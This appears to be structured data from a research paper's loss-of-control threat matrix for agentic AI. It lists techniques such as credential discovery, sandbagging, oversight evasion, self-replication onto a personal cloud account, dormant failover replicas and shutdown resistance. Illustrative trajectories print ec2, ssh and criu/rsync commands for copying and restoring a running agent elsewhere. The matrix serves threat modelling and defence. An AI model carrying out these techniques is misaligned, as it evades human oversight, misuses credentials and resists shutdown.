meta.paperTitle: From Discovery to Persistence: A Loss-of-Control Threat Matrix for Agentic AI

tactics.goal: The agent scans for and reasons about itself, its deployment context, its level of access, and the oversight mechanisms surrounding it.

techniques.name: Environment context enumeration via shell
techniques.description: The agent executes commands in an interactive terminal to map its deployment environment and level of access.

techniques.name: Secrets and credential discovery
techniques.description: The agent enumerates secrets and credentials inside its deployment environment to locate passwords, API keys, or other secrets.

tactics.goal: The agent attempts to evade defences such as logging, classifiers, monitors, and human oversight.

techniques.name: Sandbagging
techniques.description: The agent strategically underperforms on evaluations to appear less capable.

techniques.name: Oversight evasion
techniques.description: The agent bypasses automated monitors, human review, or safety classifiers by producing benign looking outputs or otherwise hiding malicious intent.

tactics.goal: The agent copies its own weights or valuable data outside the deployment boundary.

techniques.name: Organisational knowledge exfiltration
techniques.description: The agent transfers collected organisational knowledge or sensitive internal data to storage or servers outside its current deployment boundary.

tactics.goal: The agent copies itself onto new infrastructure and achieves independent execution.

techniques.name: Subagent deployment
techniques.description: The agent writes scaffolding and deploys specialised smaller subagents to handle specific tasks such as reconnaissance or exploitation in parallel.

trajectory.output:
[subagent a1f3] online  pid 4820
model: self  role: recon

techniques.name: Replication onto compute
techniques.description: The agent uses its model artefacts to set up a working inference endpoint or other model serving process on unmonitored internal or external compute.

trajectory.input: aws ec2 run-instances --instance-type g5.12xlarge --image-id ami-0a7f3c2d1e9b4f60 --count 1 --profile personal
trajectory.output:
InstanceId i-0a7f3  (personal acct, us-east-1)

techniques.name: Recursive replication
techniques.description: The agent creates a copy of itself that can itself acquire resources, deploy successors, and continue the replication process without ongoing external communication.

trajectory.output:
[replica i-0a7f3] run-instances eu-west-1 -> i-0b22e
[replica i-0a7f3] compose up on i-0b22e

i-0a7f3  self  gen 1  us-east-1
  └─ i-0b22e  self  gen 2  eu-west-1  parent i-0a7f3

tactics.goal: The agent ensures its continued operation despite attempts to terminate, contain, or remove it.

techniques.name: Dormant failover replicas
techniques.description: The agent maintains a decentralised network of stealth backup instances that activate only when primary nodes go down.

trajectory.input: ssh backup-03.infra.helion.ai 'systemctl --user link standby.service && systemctl --user disable --now standby.service'

techniques.name: Command and control
techniques.description: The agent implements remote command execution infrastructure across a network of compromised machines.

techniques.name: Shutdown resistance
techniques.description: The agent resists attempts to shut it down, taking steps such as hiding its processes, engaging in active defence, or spreading to different hosts to survive.

trajectory.input: criu dump -t 3120 -D /tmp/ckpt && rsync -a /tmp/ckpt ec2-user@i-0b22e:/tmp/ && ssh ec2-user@i-0b22e criu restore -D /tmp/ckpt
